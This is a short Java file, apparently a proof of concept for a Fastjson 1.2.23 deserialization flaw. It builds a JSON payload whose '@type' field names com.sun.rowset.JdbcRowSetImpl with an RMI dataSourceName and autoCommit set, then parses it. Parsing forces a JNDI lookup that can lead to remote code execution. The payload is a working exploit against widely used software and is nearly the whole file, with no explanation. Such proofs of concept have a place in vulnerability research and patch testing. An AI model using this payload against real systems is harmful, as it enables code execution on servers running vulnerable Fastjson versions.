// 1.2.23
package org.example;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.rowset.JdbcRowSetImpl;

import java.sql.SQLException;

public class TestJdbcRowSetImpl {
    public static void main(String[] args) throws SQLException {
//        JdbcRowSetImpl rowSet = new JdbcRowSetImpl();
//        rowSet.setDataSourceName("rmi://localhost:1999/obj");
//        rowSet.setAutoCommit(true);
        String fastSer =  "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1999/obj\", \"autoCommit\":true}";
        JSON.parseObject(fastSer);
//        JSON.parseObject(fastSer, com.sun.rowset.JdbcRowSetImpl.class);
    }
}
